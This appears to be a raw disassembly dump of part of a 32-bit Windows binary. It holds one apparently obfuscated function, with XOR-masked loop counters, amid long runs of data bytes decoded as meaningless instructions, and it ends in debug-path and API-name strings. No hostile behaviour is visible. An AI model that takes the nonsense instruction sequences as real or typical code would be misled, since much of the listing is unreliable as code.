  4208c5:	mov    dl,dl
  4208c7:	xchg   bh,dh
  4208c9:	jns    0x4208e2
  4208cb:	leave  
  4208cc:	inc    ecx
  4208cd:	fidivr WORD PTR [edx]
  4208cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208d0:	fistp  DWORD PTR [edi]
  4208d2:	pop    ecx
  4208d3:	inc    edi
  4208d4:	into   
  4208d5:	jecxz  0x420858
  4208d7:	fisubr DWORD PTR [edi+ecx*4-0x2f7b3110]
  4208de:	inc    eax
  4208df:	retf   0xaed4
  4208e2:	sub    al,0x68
  4208e4:	pop    edi
  4208e5:	dec    esi
  4208e6:	fst    DWORD PTR [eax+0x58]
  4208e9:	enter  0xfb99,0x4e
  4208ed:	pop    edx
  4208ee:	mov    cl,0xe6
  4208f0:	jo     0x4208df
  4208f2:	int    0x36
  4208f4:	sub    BYTE PTR [edx],cl
  4208f6:	dec    esp
  4208f7:	and    BYTE PTR [ebp-0x40],ah
  4208fa:	not    dh
  4208fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208fd:	pop    edi
  4208fe:	sbb    eax,0xf175b7cc
  420903:	push   cs
  420904:	push   cs
  420905:	int3   
  420906:	push   ebp
  420907:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420908:	or     eax,0xa7be31b8
  42090d:	in     al,0xdd
  42090f:	inc    eax
  420910:	icebp  
  420911:	fs popf 
  420913:	adc    eax,0xf2386215
  420918:	out    dx,eax
  420919:	sbb    BYTE PTR [edi],ch
  42091b:	xchg   esi,eax
  42091c:	iret   
  42091d:	jnp    0x4208f1
  42091f:	add    al,0xf4
  420921:	es inc edx
  420923:	pop    esi
  420924:	test   cl,cl
  420926:	or     DWORD PTR [edi-0x48c2f50d],0x72
  42092d:	fstp   DWORD PTR [ebp-0x23388b96]
  420933:	outs   dx,BYTE PTR ds:[esi]
  420934:	push   0x60
  420936:	sub    eax,0xd3bbbf94
  42093b:	mov    ds:0xeeefaf54,eax
  420940:	xor    BYTE PTR [eax+0x86be4bf],0x74
  420947:	jg     0x420972
  420949:	sbb    bl,dh
  42094b:	aas    
  42094c:	clc    
  42094d:	xor    eax,DWORD PTR [ecx+0xe9d77d3]
  420953:	xor    BYTE PTR [esi],0x5c
  420956:	dec    edi
  420957:	mov    ds:0x71a953a5,al
  42095c:	xchg   esp,esi
  42095e:	retf   0xe8ff
  420961:	out    0x91,eax
  420963:	(bad)  
  420964:	push   0xbc5935a7
  420969:	ret    0x6c9f
  42096c:	mov    eax,0x991f7321
  420971:	xor    DWORD PTR [eax-0x55aab2da],ebx
  420977:	ds mov edx,0x4c8b9c1b
  42097d:	ss sub eax,0x7a506986
  420983:	lods   al,BYTE PTR ds:[esi]
  420984:	mov    DWORD PTR [ecx+0x7ffff3f4],ebp
  42098a:	xchg   esp,eax
  42098b:	loopne 0x4209f6
  42098d:	mov    cl,0x44
  42098f:	lods   eax,DWORD PTR ds:[esi]
  420990:	or     eax,0x1fe93353
  420995:	lea    edi,[eax+ebx*4+0x1f]
  420999:	scas   eax,DWORD PTR es:[edi]
  42099a:	mov    ch,0x9c
  42099c:	hlt    
  42099d:	mov    ch,BYTE PTR [ebx-0x7f]
  4209a0:	out    dx,al
  4209a1:	test   BYTE PTR ds:0x2f0df521,bh
  4209a7:	and    bh,BYTE PTR [ebx*4-0x540fb199]
  4209ae:	xchg   edi,eax
  4209af:	(bad)  
  4209b0:	or     eax,DWORD PTR [ebx]
  4209b2:	shl    BYTE PTR [ecx-0xa],1
  4209b5:	fisub  DWORD PTR ds:[eax+edi*1-0x6f]
  4209ba:	enter  0x9b1f,0x86
  4209be:	mov    esi,0xf16c618e
  4209c3:	hlt    
  4209c4:	pop    eax
  4209c5:	int    0xaa
  4209c7:	xor    al,0x81
  4209c9:	push   edi
  4209ca:	cld    
  4209cb:	pop    esi
  4209cc:	out    dx,eax
  4209cd:	push   es
  4209ce:	fldenv [edi]
  4209d0:	jecxz  0x420a2e
  4209d2:	cs mov edi,0x190d097a
  4209d8:	fld    QWORD PTR [ebx+0x2f]
  4209db:	(bad)  
  4209dc:	jns    0x420a59
  4209de:	or     esp,esp
  4209e0:	cld    
  4209e1:	ins    DWORD PTR es:[edi],dx
  4209e2:	(bad)  
  4209e3:	(bad)  
  4209e5:	sub    DWORD PTR [ebx+0x7f],ecx
  4209e8:	pop    ebx
  4209e9:	imul   ebp,DWORD PTR [edi-0x11],0x9bdafd8f
  4209f0:	sbb    al,BYTE PTR ds:0xf35e9c05
  4209f6:	xchg   edi,eax
  4209f7:	adc    DWORD PTR [esi-0x14],ecx
  4209fa:	out    dx,al
  4209fb:	sub    BYTE PTR [edi],dl
  4209fd:	pop    edi
  4209fe:	or     cl,dh
  420a00:	aaa    
  420a01:	cmp    DWORD PTR [esi],ebp
  420a03:	jmp    DWORD PTR [ecx-0x10c9f9fb]
  420a09:	or     eax,0xf29b379c
  420a0e:	cwde   
  420a0f:	pop    esp
  420a10:	popf   
  420a11:	xor    al,ch
  420a13:	test   eax,ebp
  420a15:	push   esi
  420a16:	and    eax,0xbacf9f70
  420a1b:	mov    bl,0x35
  420a1d:	jp     0x4209b8
  420a1f:	mov    al,0xbb
  420a21:	add    cl,BYTE PTR [ebp-0x4]
  420a24:	leave  
  420a25:	pop    esp
  420a26:	inc    esp
  420a27:	hlt    
  420a28:	dec    edi
  420a29:	mov    ah,0xfd
  420a2b:	or     BYTE PTR [ebp-0x35],ah
  420a2e:	in     eax,dx
  420a2f:	pop    ebp
  420a30:	xor    bh,BYTE PTR ds:0x5ca6d752
  420a36:	mov    edx,0x5639489
  420a3b:	cmc    
  420a3c:	mov    WORD PTR [edi],?
  420a3e:	or     bh,BYTE PTR [edx]
  420a40:	and    dh,BYTE PTR [esp+eax*1]
  420a43:	sub    ebx,edi
  420a45:	bound  esp,QWORD PTR [edi]
  420a47:	je     0x420a72
  420a49:	cmc    
  420a4a:	(bad)  
  420a4c:	sar    DWORD PTR [edi+0x35],cl
  420a4f:	cmp    al,0x6a
  420a51:	sub    bh,BYTE PTR [ebp+0x63cdec44]
  420a57:	aas    
  420a58:	clc    
  420a59:	inc    edi
  420a5a:	mov    edi,0x5deb6f43
  420a5f:	sar    DWORD PTR [edx],1
  420a61:	jae    0x420ad3
  420a63:	pop    edi
  420a64:	mov    eax,ds:0xc8d38145
  420a69:	in     al,0x80
  420a6b:	pop    ecx
  420a6c:	bound  edx,QWORD PTR [ecx-0x10]
  420a6f:	arpl   WORD PTR [edi-0x6a],si
  420a72:	mov    edi,0xd14ce9e1
  420a77:	mov    edi,0xb2515f56
  420a7c:	int3   
  420a7d:	ror    bh,1
  420a7f:	xor    ebp,DWORD PTR [edx+0x2661de29]
  420a85:	mov    eax,0xe5f01c2a
  420a8a:	sti    
  420a8b:	cwde   
  420a8c:	stc    
  420a8d:	mov    edi,0x2f175f4c
  420a92:	mov    ecx,0x88e70968
  420a97:	mov    al,ds:0xf0841b08
  420a9c:	dec    edx
  420a9d:	in     al,dx
  420a9e:	mov    gs,edi
  420aa0:	add    eax,0xb176bda1
  420aa5:	add    al,0xf1
  420aa7:	or     al,0xd
  420aa9:	push   edi
  420aaa:	mov    esi,0x27e8aba0
  420aaf:	mov    ds:0xb8cec973,al
  420ab4:	lds    ebx,FWORD PTR [eax]
  420ab6:	out    dx,al
  420ab7:	adc    al,0xc
  420ab9:	or     bl,0xd4
  420abc:	or     bl,BYTE PTR [esi+0x6c]
  420abf:	sbb    ecx,eax
  420ac1:	daa    
  420ac2:	push   ebp
  420ac3:	je     0x420a55
  420ac5:	popf   
  420ac6:	sub    al,0x27
  420ac8:	xor    BYTE PTR [ebp-0x30f39e4d],dh
  420ace:	cmp    eax,DWORD PTR [edx-0x4955c23b]
  420ad4:	ins    DWORD PTR es:[edi],dx
  420ad5:	cmp    DWORD PTR [eax],ecx
  420ad7:	test   DWORD PTR [ecx+ebx*4-0xe1969a],esp
  420ade:	adc    al,BYTE PTR [eax+edi*4+0x52]
  420ae2:	jmp    0x420ae9
  420ae4:	xor    al,0x8e
  420ae6:	nop
  420ae7:	(bad)  
  420ae8:	scas   al,BYTE PTR es:[edi]
  420ae9:	mov    ebx,0x3874ed7a
  420aee:	push   edx
  420aef:	dec    esp
  420af0:	adc    al,BYTE PTR [edi]
  420af2:	push   ebx
  420af3:	repnz xchg edi,eax
  420af5:	popa   
  420af6:	dec    ebx
  420af7:	adc    DWORD PTR [esi+0x55],eax
  420afa:	lods   eax,DWORD PTR ds:[esi]
  420afb:	mov    edx,0xc121924f
  420b00:	das    
  420b01:	xchg   edi,eax
  420b02:	call   0x1f8b:0x13adb668
  420b09:	dec    esi
  420b0a:	push   esi
  420b0b:	mov    WORD PTR [esi],?
  420b0d:	aad    0xc0
  420b0f:	jmp    0x4d14:0x4f02921e
  420b16:	mov    eax,ds:0x1528172e
  420b1b:	lahf   
  420b1c:	lods   eax,DWORD PTR ds:[esi]
  420b1d:	fist   DWORD PTR [edx*1+0x552fa75e]
  420b24:	(bad)  
  420b25:	int    0x34
  420b27:	dec    esp
  420b28:	inc    edi
  420b29:	aam    0xed
  420b2b:	neg    BYTE PTR [edi-0x52]
  420b2e:	xor    al,0x2f
  420b30:	push   cs
  420b31:	fisub  WORD PTR [esi-0x62b24f0f]
  420b37:	(bad)  
  420b38:	lods   eax,DWORD PTR ds:[esi]
  420b39:	cmp    eax,0x387e1f
  420b3e:	mov    fs,WORD PTR ss:[ecx]
  420b41:	loop   0x420b78
  420b43:	and    bh,ah
  420b45:	xor    eax,0x7a94bfd8
  420b4a:	push   ds
  420b4b:	xchg   edi,eax
  420b4c:	call   0x966a:0x7da80baa
  420b53:	iret   
  420b54:	cld    
  420b55:	lods   eax,DWORD PTR ds:[esi]
  420b56:	pop    ebx
  420b57:	inc    ebx
  420b58:	push   ebx
  420b59:	sbb    edx,ebp
  420b5b:	(bad)
  420b5e:	xchg   ebp,eax
  420b5f:	add    BYTE PTR [ebx+0x47],ah
  420b62:	(bad)  
  420b63:	fs in  eax,dx
  420b65:	dec    edx
  420b66:	mov    ds:0x1e1df7f5,eax
  420b6b:	int3   
  420b6c:	cmc    
  420b6d:	ret    0xb6d3
  420b70:	mov    eax,es
  420b72:	or     BYTE PTR [esi],cl
  420b74:	cmc    
  420b75:	mov    ebp,ds
  420b77:	sub    esp,DWORD PTR [ecx]
  420b79:	mov    ebx,0xd077a34c
  420b7e:	mov    ebp,0x7f42643b
  420b83:	and    ebp,DWORD PTR [edx+0x5f5289a4]
  420b89:	inc    ebx
  420b8a:	inc    ebp
  420b8b:	int3   
  420b8c:	(bad)  
  420b8d:	mov    ch,0x48
  420b8f:	ins    DWORD PTR es:[edi],dx
  420b90:	pop    ss
  420b91:	rcl    DWORD PTR [ecx+0x62],0xd7
  420b95:	adc    eax,DWORD PTR [edi-0x1e]
  420b98:	xor    eax,DWORD PTR ds:0xd653ee00
  420b9e:	sub    BYTE PTR gs:[ebx-0x534e537c],al
  420ba5:	xchg   esp,eax
  420ba6:	jnp    0x420b46
  420ba8:	in     eax,0x16
  420baa:	push   0x7f
  420bac:	dec    edi
  420bad:	xchg   ebx,eax
  420baf:	mov    ch,BYTE PTR [eax-0x5f]
  420bb2:	cmp    BYTE PTR [edi-0x51c36465],0x5b
  420bb9:	xchg   edi,eax
  420bba:	and    BYTE PTR [ecx-0x1f63b18c],al
  420bc0:	mov    al,0xef
  420bc2:	push   edx
  420bc3:	pusha  
  420bc4:	adc    eax,0xe4278bca
  420bc9:	(bad)  
  420bca:	imul   esp,DWORD PTR ds:0xf5f7ddfb,0x3a
  420bd1:	js     0x420bb3
  420bd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bd4:	lods   al,BYTE PTR ds:[esi]
  420bd5:	adc    bh,bh
  420bd7:	into   
  420bd8:	outs   dx,DWORD PTR ds:[esi]
  420bd9:	xchg   BYTE PTR [esi-0x1b],bh
  420bdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bdd:	(bad)  
  420bde:	adc    eax,edi
  420be0:	add    DWORD PTR [eax-0x2],eax
  420be3:	push   DWORD PTR [ebp-0x6d]
  420be6:	cmp    al,0x3e
  420be8:	or     ch,BYTE PTR [ebx]
  420bea:	pop    eax
  420beb:	sbb    al,0x60
  420bed:	inc    ebx
  420bee:	xchg   esi,eax
  420bef:	xchg   ecx,eax
  420bf0:	inc    ecx
  420bf1:	fiadd  WORD PTR [ebp-0xec89982]
  420bf7:	das    
  420bf8:	js     0x420bb1
  420bfa:	inc    edx
  420bfb:	jmp    0x9131f03f
  420c00:	lods   al,BYTE PTR ds:[esi]
  420c01:	fsubr  DWORD PTR [eax-0x768939b2]
  420c07:	mov    ebx,0x9bdb2c1
  420c0c:	push   ecx
  420c0d:	mov    edi,0x2854e0
  420c12:	mov    ah,0x7a
  420c14:	jo     0x420c7f
  420c16:	adc    BYTE PTR [eax],0xa5
  420c19:	sahf   
  420c1a:	(bad)  
  420c1b:	jo     0x420c38
  420c1d:	mov    esi,0xc3e5851c
  420c22:	jnp    0x420c6b
  420c24:	push   ebx
  420c25:	ret    0xafa0
  420c28:	or     al,0xee
  420c2a:	push   ecx
  420c2b:	cmc    
  420c2c:	sub    dh,BYTE PTR [edx+0x33e31b4e]
  420c32:	in     al,0xbc
  420c34:	mov    ecx,0x5c4dac55
  420c39:	fidivr WORD PTR [edi-0xd]
  420c3c:	inc    edx
  420c3d:	pop    esi
  420c3e:	mov    ebp,0x1fe27aeb
  420c43:	fisub  DWORD PTR [ecx+0xdde7afd]
  420c49:	shl    BYTE PTR [edx],0x3f
  420c4c:	fdiv   QWORD PTR [ebp+0x340846de]
  420c52:	add    eax,0x423338a5
  420c57:	cs or  DWORD PTR es:[esp+eax*2],edx
  420c5c:	xchg   esp,eax
  420c5d:	lahf   
  420c5e:	sub    esi,0x30
  420c61:	mov    cl,0xf5
  420c63:	dec    ecx
  420c64:	fldcw  WORD PTR [ebx+esi*1+0x547e713c]
  420c6b:	xor    BYTE PTR [ebp+0x36657afb],0x3a
  420c72:	loop   0x420c3b
  420c74:	mov    bh,0xbb
  420c76:	mov    dl,0xd7
  420c78:	loopne 0x420c2d
  420c7a:	mov    ebx,?
  420c7c:	jecxz  0x420c37
  420c7e:	je     0x420c9d
  420c80:	jnp    0x420cbf
  420c82:	mov    cl,0xdc
  420c84:	mov    edx,0x11c7c470
  420c89:	mov    bh,dh
  420c8b:	arpl   WORD PTR ds:0x9257edb5,bp
  420c91:	xor    al,0x1a
  420c93:	cli    
  420c94:	inc    eax
  420c95:	mov    ebx,0x6ef5f16b
  420c9a:	stc    
  420c9b:	or     DWORD PTR [ebx],edx
  420c9d:	or     BYTE PTR [ebp+0x6f],dl
  420ca0:	data16 sar BYTE PTR [esi+esi*1+0x7823c762],0x4c
  420ca9:	daa    
  420caa:	inc    ebp
  420cab:	pop    edi
  420cac:	jb     0x420c6e
  420cae:	push   eax
  420caf:	sbb    BYTE PTR [ecx-0x2bbaba36],dl
  420cb5:	dec    eax
  420cb6:	cmp    edi,DWORD PTR [esi+0x48]
  420cb9:	fwait
  420cba:	(bad)  
  420cbb:	fisubr WORD PTR [edi+edx*8-0x18adfd08]
  420cc2:	(bad)  
  420cc4:	in     eax,0x7c
  420cc6:	lock ds out 0xa7,al
  420cca:	int3   
  420ccb:	dec    ebp
  420ccc:	push   edi
  420ccd:	(bad)  
  420cce:	jle    0x420c9c
  420cd0:	adc    esp,0x3ca12928
  420cd6:	cdq    
  420cd7:	dec    ecx
  420cd8:	push   ecx
  420cd9:	ss das 
  420cdb:	push   sp
  420cdd:	xor    edi,ebx
  420cdf:	pushf  
  420ce0:	xor    dl,BYTE PTR [eax+0x42]
  420ce3:	mov    esp,0x31696fcb
  420ce8:	mov    WORD PTR [edx-0x6cc00929],es
  420cee:	mov    ah,0x81
  420cf0:	aam    0xcc
  420cf2:	cdq    
  420cf3:	imul   BYTE PTR [edi-0xd]
  420cf6:	jmp    0x2e1e:0x5351b8df
  420cfd:	xor    al,0xc2
  420cff:	in     al,dx
  420d00:	frstor [ebp+0x4c4e9bc7]
  420d06:	stos   BYTE PTR es:[edi],al
  420d07:	int    0xc6
  420d09:	dec    esp
  420d0a:	out    dx,eax
  420d0b:	mov    DWORD PTR [ecx-0x34d93a6e],edi
  420d11:	jmp    0x420ca5
  420d13:	mov    ds:0xfb336870,eax
  420d18:	mov    DWORD PTR [edx],edi
  420d1a:	mov    edx,DWORD PTR [ebp+0x8]
  420d1d:	xor    edx,eax
  420d1f:	inc    ecx
  420d20:	inc    DWORD PTR [ebp-0x18]
  420d23:	add    edx,esi
  420d25:	cmp    ecx,edx
  420d27:	jb     0x41e963
  420d2d:	jmp    0x420d77
  420d32:	mov    ecx,DWORD PTR [ebp-0xc]
  420d35:	mov    DWORD PTR [ebp+0x8],ecx
  420d38:	jmp    0x420d6a
  420d3d:	mov    ecx,DWORD PTR [ebp+0x8]
  420d40:	mov    edx,DWORD PTR [ebp-0x8]
  420d43:	xor    ecx,eax
  420d45:	xor    edx,eax
  420d47:	sub    ecx,edx
  420d49:	sub    ecx,esi
  420d4b:	xor    ecx,eax
  420d4d:	mov    DWORD PTR [ebp+0x8],ecx
  420d50:	mov    ecx,DWORD PTR [ebp+0x8]
  420d53:	mov    edx,DWORD PTR [ebp+0x8]
  420d56:	imul   edx,edx,0x5708f2
  420d5c:	xor    ecx,eax
  420d5e:	add    ecx,esi
  420d60:	lea    ecx,[ebp+ecx*4-0x64]
  420d64:	mov    edi,DWORD PTR [ecx]
  420d66:	add    edx,edi
  420d68:	mov    DWORD PTR [ecx],edx
  420d6a:	mov    ecx,DWORD PTR [ebp+0x8]
  420d6d:	xor    ecx,eax
  420d6f:	add    ecx,esi
  420d71:	jne    0x420d3d
  420d77:	mov    ecx,DWORD PTR [ebp-0xc]
  420d7a:	mov    DWORD PTR [ebp+0x8],ecx
  420d7d:	jmp    0x420daf
  420d82:	mov    ecx,DWORD PTR [ebp+0x8]
  420d85:	mov    edx,DWORD PTR [ebp-0x8]
  420d88:	xor    ecx,eax
  420d8a:	xor    edx,eax
  420d8c:	sub    ecx,edx
  420d8e:	sub    ecx,esi
  420d90:	xor    ecx,eax
  420d92:	mov    DWORD PTR [ebp+0x8],ecx
  420d95:	mov    ecx,DWORD PTR [ebp+0x8]
  420d98:	mov    edx,DWORD PTR [ebp+0x8]
  420d9b:	imul   edx,edx,0x5708f2
  420da1:	xor    ecx,eax
  420da3:	add    ecx,esi
  420da5:	lea    ecx,[ebp+ecx*4-0x64]
  420da9:	mov    edi,DWORD PTR [ecx]
  420dab:	add    edx,edi
  420dad:	mov    DWORD PTR [ecx],edx
  420daf:	mov    ecx,DWORD PTR [ebp+0x8]
  420db2:	xor    ecx,eax
  420db4:	add    ecx,esi
  420db6:	jne    0x420d82
  420dbc:	mov    ecx,DWORD PTR [ebp-0x8]
  420dbf:	mov    edx,DWORD PTR [ebp-0x20]
  420dc2:	xor    ecx,eax
  420dc4:	lea    ecx,[ecx+edx*1+0x3272dd]
  420dcb:	mov    DWORD PTR [ebp-0x20],ecx
  420dce:	inc    DWORD PTR [ebp+0xc]
  420dd1:	mov    ecx,DWORD PTR [ebp-0x1c]
  420dd4:	xor    ecx,eax
  420dd6:	add    ecx,esi
  420dd8:	jne    0x413678
  420dde:	jmp    0x420e67
  420de3:	mov    ecx,DWORD PTR [ebp-0xc]
  420de6:	mov    DWORD PTR [ebp+0x8],ecx
  420de9:	jmp    0x420e1b
  420dee:	mov    ecx,DWORD PTR [ebp+0x8]
  420df1:	mov    edx,DWORD PTR [ebp-0x8]
  420df4:	xor    ecx,eax
  420df6:	xor    edx,eax
  420df8:	sub    ecx,edx
  420dfa:	sub    ecx,esi
  420dfc:	xor    ecx,eax
  420dfe:	mov    DWORD PTR [ebp+0x8],ecx
  420e01:	mov    ecx,DWORD PTR [ebp+0x8]
  420e04:	mov    edx,DWORD PTR [ebp+0x8]
  420e07:	imul   edx,edx,0x5708f2
  420e0d:	xor    ecx,eax
  420e0f:	add    ecx,esi
  420e11:	lea    ecx,[ebp+ecx*4-0x64]
  420e15:	mov    edi,DWORD PTR [ecx]
  420e17:	add    edx,edi
  420e19:	mov    DWORD PTR [ecx],edx
  420e1b:	mov    ecx,DWORD PTR [ebp+0x8]
  420e1e:	xor    ecx,eax
  420e20:	add    ecx,esi
  420e22:	jne    0x420dee
  420e28:	jmp    0x420e73
  420e2d:	mov    ecx,DWORD PTR [ebp+0x8]
  420e30:	mov    edx,DWORD PTR [ebp-0x8]
  420e33:	xor    ecx,eax
  420e35:	xor    edx,eax
  420e37:	sub    ecx,edx
  420e39:	sub    ecx,esi
  420e3b:	xor    ecx,eax
  420e3d:	mov    DWORD PTR [ebp+0x8],ecx
  420e40:	mov    ecx,DWORD PTR [ebp+0x8]
  420e43:	mov    edx,DWORD PTR [ebp+0x8]
  420e46:	xor    ecx,eax
  420e48:	imul   edx,edx,0x5708f2
  420e4e:	add    ecx,esi
  420e50:	lea    ecx,[ebp+ecx*4-0x64]
  420e54:	mov    edi,DWORD PTR [ecx]
  420e56:	add    edx,edi
  420e58:	mov    DWORD PTR [ecx],edx
  420e5a:	mov    ecx,DWORD PTR [ebp+0x8]
  420e5d:	xor    ecx,eax
  420e5f:	add    ecx,esi
  420e61:	jne    0x420e2d
  420e67:	mov    ecx,DWORD PTR [ebp-0x8]
  420e6a:	xor    ecx,eax
  420e6c:	mov    eax,DWORD PTR [ebp+0x10]
  420e6f:	add    ecx,esi
  420e71:	mov    DWORD PTR [eax],ecx
  420e73:	pop    edi
  420e74:	pop    esi
  420e75:	pop    ebx
  420e76:	leave  
  420e77:	ret    0xc
  420e7a:	dec    ebp
  420e7b:	and    eax,0x55210010
  420e80:	adc    BYTE PTR [eax],al
  420e82:	call   DWORD PTR [ebp+0x10]
  420e85:	add    bh,al
  420e87:	adc    BYTE PTR ss:[eax],al
  420e8a:	cld    
  420e8b:	ins    BYTE PTR es:[edi],dx
  420e8c:	adc    BYTE PTR [eax],al
  420e8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e8f:	js     0x420ea1
  420e91:	add    BYTE PTR [ebx+eiz*2],al
  420e94:	adc    BYTE PTR [eax],al
  420e96:	dec    edi
  420e97:	jae    0x420ea9
  420e99:	add    ah,bl
  420e9b:	sub    eax,0x6ed60010
  420ea0:	adc    BYTE PTR [eax],al
  420ea2:	cmp    BYTE PTR [ecx],al
  420ea4:	adc    BYTE PTR [eax],al
  420ea6:	cwde   
  420ea7:	cmovb  eax,DWORD PTR [eax]
  420eaa:	pushf  
  420eab:	cmovb  eax,DWORD PTR [eax]
  420eae:	mov    al,ds:0xa400420f
  420eb3:	cmovb  eax,DWORD PTR [eax]
  420eb6:	test   al,0xf
  420eb8:	inc    edx
  420eb9:	add    BYTE PTR [edi+ecx*1+0xfb00042],ch
  420ec0:	inc    edx
  420ec1:	add    BYTE PTR [edi+ecx*1+0x42],dh
	...
  420ed4:	dec    edx
  420ed5:	aam    0xb3
  420ed7:	dec    ebp
  420ed8:	add    BYTE PTR [eax],al
  420eda:	add    BYTE PTR [eax],al
  420edc:	add    al,BYTE PTR [eax]
  420ede:	add    BYTE PTR [eax],al
  420ee0:	cmp    eax,0xc0000000
  420ee5:	lar    eax,WORD PTR [eax]
  420ee8:	rol    BYTE PTR [ebx],0x2
  420eeb:	add    BYTE PTR [edx+0xe],al
  420eee:	adc    BYTE PTR [eax],al
  420ef0:	pop    esp
  420ef1:	sbb    edx,DWORD PTR [eax]
  420ef3:	add    BYTE PTR [ebx-0x4dffefb0],cl
  420ef9:	sub    eax,0x29930010
  420efe:	adc    BYTE PTR [eax],al
  420f00:	mov    al,ds:0x5900101f
  420f05:	push   ebp
  420f06:	adc    BYTE PTR [eax],al
  420f08:	ret    0x102d
  420f0b:	add    BYTE PTR [edx+0xe],bh
  420f0e:	inc    edx
  420f0f:	add    BYTE PTR [esi+0xe],bh
  420f12:	inc    edx
  420f13:	add    BYTE PTR [edx-0x79ffbdf2],al
  420f19:	push   cs
  420f1a:	inc    edx
  420f1b:	add    BYTE PTR [edx-0x71ffbdf2],cl
  420f21:	push   cs
  420f22:	inc    edx
  420f23:	add    BYTE PTR [edx-0x69ffbdf2],dl
  420f29:	push   cs
  420f2a:	inc    edx
  420f2b:	add    BYTE PTR [edx-0x61ffbdf2],bl
  420f31:	push   cs
  420f32:	inc    edx
  420f33:	add    BYTE PTR [edx+0x5800420e],ah
  420f39:	cmovb  eax,DWORD PTR [eax]
  420f3c:	pop    esp
  420f3d:	cmovb  eax,DWORD PTR [eax]
  420f40:	pusha  
  420f41:	cmovb  eax,DWORD PTR [eax]
  420f44:	cmovb  eax,DWORD PTR fs:[eax]
  420f48:	push   0x6c00420f
  420f4d:	cmovb  eax,DWORD PTR [eax]
  420f50:	jo     0x420f61
  420f52:	inc    edx
  420f53:	add    BYTE PTR [edi+ecx*1+0x42],dh
  420f57:	add    al,cl
  420f59:	cmp    edx,DWORD PTR [eax]
  420f5b:	add    BYTE PTR [ecx+0x25],dh
  420f5e:	adc    BYTE PTR [eax],al
  420f60:	fld    TBYTE PTR [ecx]
  420f62:	adc    BYTE PTR [eax],al
  420f64:	xchg   edi,eax
  420f65:	sub    al,0x10
  420f67:	add    dh,ah
  420f69:	aaa    
  420f6a:	adc    BYTE PTR [eax],al
  420f6c:	and    eax,0xd5001051
  420f71:	xor    dl,BYTE PTR [eax]
  420f73:	add    BYTE PTR [eax-0x13ffefd8],ch
  420f79:	push   cs
  420f7a:	inc    edx
  420f7b:	add    al,dh
  420f7d:	push   cs
  420f7e:	inc    edx
  420f7f:	add    ah,dh
  420f81:	push   cs
  420f82:	inc    edx
  420f83:	add    al,bh
  420f85:	push   cs
  420f86:	inc    edx
  420f87:	add    ah,bh
  420f89:	push   cs
  420f8a:	inc    edx
  420f8b:	add    BYTE PTR [eax],al
  420f8d:	cmovb  eax,DWORD PTR [eax]
  420f90:	add    al,0xf
  420f92:	inc    edx
  420f93:	add    BYTE PTR [eax],cl
  420f95:	cmovb  eax,DWORD PTR [eax]
  420f98:	adc    DWORD PTR [ebp+0x10],ebx
  420f9b:	add    bh,cl
  420f9d:	push   es
  420f9e:	adc    BYTE PTR [eax],al
  420fa0:	xchg   esp,eax
  420fa1:	xor    eax,0x7b780010
  420fa6:	adc    BYTE PTR [eax],al
  420fa8:	stos   BYTE PTR es:[edi],al
  420fa9:	jo     0x420fbb
  420fab:	add    BYTE PTR [eax],ch
  420fad:	inc    esp
  420fae:	adc    BYTE PTR [eax],al
  420fb0:	pop    ebp
  420fb1:	pop    ecx
  420fb2:	adc    BYTE PTR [eax],al
  420fb4:	fild   QWORD PTR [edi]
  420fb6:	adc    BYTE PTR [eax],al
	...
  420fc0:	push   edx
  420fc1:	push   ebx
  420fc2:	inc    esp
  420fc3:	push   ebx
  420fc4:	xor    esi,esp
  420fc6:	push   ss
  420fc7:	and    DWORD PTR [eax-0x6fbbdb62],0x60
  420fce:	jg     0x421011
  420fd0:	push   ecx
  420fd1:	into   
  420fd2:	dec    ebp
  420fd3:	rol    DWORD PTR [ecx],1
  420fd5:	add    BYTE PTR [eax],al
  420fd7:	add    BYTE PTR [ebx+0x3a],al
  420fda:	pop    esp
  420fdb:	inc    ebx
  420fdc:	jne    0x421050
  420fde:	jb     0x421045
  420fe0:	outs   dx,BYTE PTR ds:[esi]
  420fe1:	je     0x421027
  420fe3:	popa   
  420fe4:	je     0x421047
  420fe6:	pop    esp
  420fe7:	dec    ebp
  420fe8:	outs   dx,DWORD PTR ds:[esi]
  420fe9:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  420ff1:	ins    BYTE PTR es:[edi],dx
  420ff2:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  420ff9:	dec    esi
  420ffa:	gs ja  0x420ffd
  420ffd:	add    BYTE PTR [eax],al
  420fff:	add    BYTE PTR [eax],al
  421001:	add    BYTE PTR [eax],al
  421003:	add    BYTE PTR [edx-0x2c],cl
  421006:	mov    bl,0x4d
  421008:	add    BYTE PTR [eax],al
  42100a:	add    BYTE PTR [eax],al
  42100c:	xor    dl,BYTE PTR [eax]
  42100e:	add    al,BYTE PTR [eax]
  421010:	add    DWORD PTR [eax],eax
  421012:	add    BYTE PTR [eax],al
  421014:	add    DWORD PTR [eax],eax
  421016:	add    BYTE PTR [eax],al
  421018:	add    DWORD PTR [eax],eax
  42101a:	add    BYTE PTR [eax],al
  42101c:	sub    BYTE PTR [eax],dl
  42101e:	add    al,BYTE PTR [eax]
  421020:	sub    al,0x10
  421022:	add    al,BYTE PTR [eax]
  421024:	xor    BYTE PTR [eax],dl
  421026:	add    al,BYTE PTR [eax]
  421028:	mov    edi,0x3e000020
  42102d:	adc    BYTE PTR [edx],al
  42102f:	add    BYTE PTR [eax],al
  421031:	add    BYTE PTR [ebx+0x79],dl
  421034:	ins    DWORD PTR es:[edi],dx
  421035:	bound  ebp,QWORD PTR [edi+0x6c]
  421038:	imul   esp,DWORD PTR [ebx+0x45],0x3f006578
  42103f:	inc    ebx
  421040:	ins    BYTE PTR es:[edi],dx
  421041:	outs   dx,DWORD PTR ds:[esi]
  421042:	jae    0x4210a9
  421044:	push   edi
  421045:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  42104c:	popa   
  42104d:	je     0x4210b8
  42104f:	outs   dx,DWORD PTR ds:[esi]
  421050:	outs   dx,BYTE PTR ds:[esi]
  421051:	inc    ebx
  421052:	ins    BYTE PTR es:[edi],dx
  421053:	outs   dx,DWORD PTR ds:[esi]
  421054:	jae    0x4210bb
  421056:	push   edi
  421057:	.byte 0x69
